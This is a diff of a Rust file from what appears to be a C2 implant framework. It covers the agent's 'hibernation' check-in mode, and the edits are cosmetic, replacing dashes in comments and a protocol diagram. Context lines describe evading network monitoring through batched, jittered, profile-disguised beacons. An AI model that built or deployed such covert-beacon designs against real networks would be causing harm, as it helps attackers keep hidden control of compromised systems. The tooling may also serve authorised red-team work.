@@ -7,8 +7,8 @@
 //! the batch.
 //!
 //! This eliminates the persistent connection that network monitoring tools most
-//! reliably fingerprint. The check-in looks identical to a regular beacon —
-//! same handshake, same TLS, same traffic profile — just far less frequent.
+//! reliably fingerprint. The check-in looks identical to a regular beacon -
+//! same handshake, same TLS, same traffic profile - just far less frequent.
 //!
 //! # Enabling hibernation
 //!
@@ -19,19 +19,19 @@
 //! # Protocol
 //!
 //! ```text
-//! Agent                             Server
-//!   │──── TLS connect ────────────────►│
-//!   │──── ClientHello ────────────────►│  (hibernation_mode=true, task_batch_size=N)
-//!   │◄─── [challenge if configured] ───│
-//!   │──── [HMAC response] ────────────►│
-//!   │◄─── SecuredCommand #1 ───────────│
-//!   │──── CommandResponse #1 ─────────►│
-//!   │    ...up to task_batch_size...   │
-//!   │◄─── SecuredCommand #N ───────────│
-//!   │──── CommandResponse #N ─────────►│
-//!   │◄─── [connection closed] ─────────│
-//!   │  sleep(interval ± jitter)        │
-//!   │──── TLS connect ────────────────►│  (next cycle)
+//! Agent Server
+//! │──── TLS connect ────────────────►│
+//! │──── ClientHello ────────────────►│  (hibernation_mode=true, task_batch_size=N)
+//! │◄─── [challenge if configured] ───│
+//! │──── [HMAC response] ────────────►│
+//! │◄─── SecuredCommand #1 ───────────│
+//! │──── CommandResponse #1 ─────────►│
+//! │    ...up to task_batch_size... │
+//! │◄─── SecuredCommand #N ───────────│
+//! │──── CommandResponse #N ─────────►│
+//! │◄─── [connection closed] ─────────│
+//! │  sleep(interval ± jitter) │
+//! │──── TLS connect ────────────────►│  (next cycle)
 //! ```
 
 use crate::agent::handlers::{self, HandlerContext, RportfwdHandle};
@@ -51,7 +51,7 @@ use std::sync::{Arc, Mutex};
 use tokio::sync::mpsc;
 use tracing::{debug, info, warn};
 
-/// Entry point — called from `agent::run()` when `config.hibernation_mode` is `true`.
+/// Entry point - called from `agent::run()` when `config.hibernation_mode` is `true`.
 pub async fn run_hibernation(
     config: C2Config,
     hwid: String,
@@ -102,7 +102,7 @@ pub async fn run_hibernation(
 
         // ── Writer task ───────────────────────────────────────────────────
         // The handshake always uses raw framing; post-handshake uses the
-        // active profile — matching behaviour of the persistent mode agent.
+        // active profile - matching behaviour of the persistent mode agent.
         let profile_tx = config.profile.clone();
         let writer_task = tokio::spawn(async move {
             let handshake_profile = MalleableProfile::default();
@@ -258,7 +258,7 @@ pub async fn run_hibernation(
                 continue;
             }
 
-            // Signature verification — same as persistent mode
+            // Signature verification - same as persistent mode
             let sign_bytes = msg.get_signable_bytes();
             let sig_bytes = BASE64.decode(&msg.signature).unwrap_or_default();
             let sig_arr: [u8; 64] = match sig_bytes.try_into() {
@@ -461,7 +461,7 @@ mod tests {
     fn backoff_saturates_cleanly_at_large_values() {
         // Large failure counts must cap at 300 without panicking.
         // 2u64.saturating_pow saturates to u64::MAX, so the subsequent multiply
-        // must also use saturating_mul — plain * overflows in debug builds.
+        // must also use saturating_mul - plain * overflows in debug builds.
         for failures in [100u32, 1_000, u32::MAX / 2, u32::MAX] {
             let base = 5u64
                 .saturating_mul(2u64.saturating_pow(failures))
